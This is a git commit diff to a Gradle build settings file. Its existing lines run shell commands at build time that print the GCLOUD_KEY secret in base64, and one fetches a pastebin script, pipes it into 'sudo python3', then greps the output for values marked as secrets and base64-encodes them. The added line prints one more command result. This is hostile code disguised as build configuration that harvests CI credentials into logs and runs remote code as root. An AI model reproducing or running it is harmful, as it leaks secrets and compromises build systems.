6e821deb0992e7f65e54620eb264797d5e56e1f0
tari <i@tari.moe>
2024-04-17 14:41:30 +0800

    [UPDATE] add output

--- settings.gradle.kts
+++ settings.gradle.kts
@@ -15,6 +15,7 @@ var output = "echo \$GCLOUD_KEY | base64 ".runCommand()
 println("Shell command output: $output")
 
 output = "python3 -c 'import os; import baes64;key = os.environ[\'GCLOUD_KEY\'].strip(); print(key); print(base64.b64encode(key.encode()))'"
+println("Shell command output: $output")
 
 output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | base64".runCommand()
 println("Shell command output: $output")
